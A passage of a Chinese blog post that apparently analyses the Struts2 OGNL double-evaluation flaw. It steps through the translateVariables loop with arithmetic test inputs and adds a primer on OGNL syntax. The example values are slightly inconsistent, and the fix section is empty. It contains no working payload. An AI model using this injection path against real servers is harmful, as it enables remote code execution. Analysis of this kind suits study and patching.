+
+<p>然后这次的判断跳过了中间的return，为啥会跳过return呢？因为这里的password内容任然是一个ognl表达式所以会再次进入循环，接着这里取出%{password}中间的值password赋给var。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>     <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> expression.indexOf(open + <span class="hljs-string">&quot;&#123;&quot;</span>);<br>     <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> expression.length();<br>     <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> start + <span class="hljs-number">2</span>;<br>     <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>
+
+<p>然后通过Object o &#x3D; stack.findValue(var, asType)获得到password的值为333*666，然后重新赋值给expression，进行下一次循环。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">var</span> <span class="hljs-operator">=</span> expression.substring(start + <span class="hljs-number">2</span>, end);<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> stack.findValue(<span class="hljs-keyword">var</span>, asType);<br></code></pre></td></tr></table></figure>
+
+<p>在这一次循环的时候，就会解析1*5，并将赋值给了o,经过计算后expression的值就变成了5。</p>
+<p>不是OGNL表达式时就会进入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> x - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (start == -<span class="hljs-number">1</span> || end == -<span class="hljs-number">1</span> || count != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);<br>        &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个时候就会输出结果</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h3 id="ognl表达式"><a href="#ognl表达式" class="headerlink" title="ognl表达式"></a>ognl表达式</h3><p>OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression  Language，简称为  EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。 OGNL 三要素：</p>
+<ol>
+<li><p>表达式（Expression）</p>
+<p>表达式是整个 OGNL 的核心，所有的 OGNL 操作都是针对表达式的解析后进行的。表达式会规定此次 OGNL  操作到底要干什么。我们可以看到，在上面的测试中，name、department.name 等都是表达式，表示取 name 或者  department 中的 name 的值。OGNL 支持很多类型的表达式，之后我们会看到更多</p>
+</li>
+<li><p>根对象（Root Object）</p>
+<p>根对象可以理解为 OGNL 的操作对象。在表达式规定了 “干什么” 以后，你还需要指定到底“对谁干”。在上面的测试代码中，user  就是根对象。这就意味着，我们需要对 user 这个对象去取 name 这个属性的值（对 user 这个对象去设置其中的 department  中的 name 属性值）</p>
+</li>
+<li><p>上下文环境（Context）</p>
+<p>有了表达式和根对象，我们实际上已经可以使用 OGNL 的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在 OGNL  的内部，所有的操作都会在一个特定的环境中运行，这个环境就是 OGNL  的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定 OGNL 的操作 “在哪里干”。<br>OGN L 的上下文环境是一个 Map 结构，称之为 OgnlContext。上面我们提到的根对象（Root<br>Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root<br>Object）的存取操作的表达式是不需要增加 #符号进行区分的。</p>
+</li>
+</ol>
+<p>表达式功能操作清单：</p>
+<blockquote>
+<p>\1. 基本对象树的访问<br>对象树的访问就是通过使用点号将对象的引用串联起来进行。<br>例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx2. 对容器变量的访问<br>对容器变量的访问，通过#符号加上表达式进行。<br>例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx3. 使用操作符号<br>OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, &#x2F;, ++, –, &#x3D;&#x3D;, !&#x3D;, &#x3D; 等操作符之外，还能使用 mod, in, not in等。4. 容器、数组、对象<br>OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]<br>同时，OGNL支持对Map的按键值查找：<br>例如：#session[‘mySessionPropKey’]<br>不仅如此，OGNL还支持容器的构造的表达式：<br>例如：{“green”, “red”, “blue”}构造一个List，#{“key1” : “value1”, “key2” : “value2”, “key3” : “value3”}构造一个Map<br>你也可以通过任意类对象的构造函数进行对象新建<br>例如：new Java.net.URL(“xxxxxx&#x2F;“)5. 对静态方法或变量的访问<br>要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：6. 方法调用<br>直接通过类似Java的方法调用方式进行，你甚至可以传递参数：<br>例如：user.getName()，group.users.size()，group.containsUser(#requestUser)7. 投影和选择<br>OGNL支持类似数据库中的投影（projection） 和选择（selection）。<br>投影就是选出<strong>中每个元素的相同属性组成新的</strong>，类似于关系数据库的字段操作。投影操作语法为 collection.{XXX}，其中XXX 是这个<strong>中每个元素的公共属性。<br>例如：group.userList.{username}将获得某个group中的所有user的name的列表。<br>选择就是过滤满足selection 条件的</strong>元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.{X YYY}，其中X 是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：<br>? 选择满足条件的所有元素<br>^ 选择满足条件的第一个元素<br>$ 选择满足条件的最后一个元素<br>例如：group.userList.{? #txxx.xxx !&#x3D; null}将获得某个group中user的name不为空的user的列表</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java/" class="print-no-link">#java</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/love.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
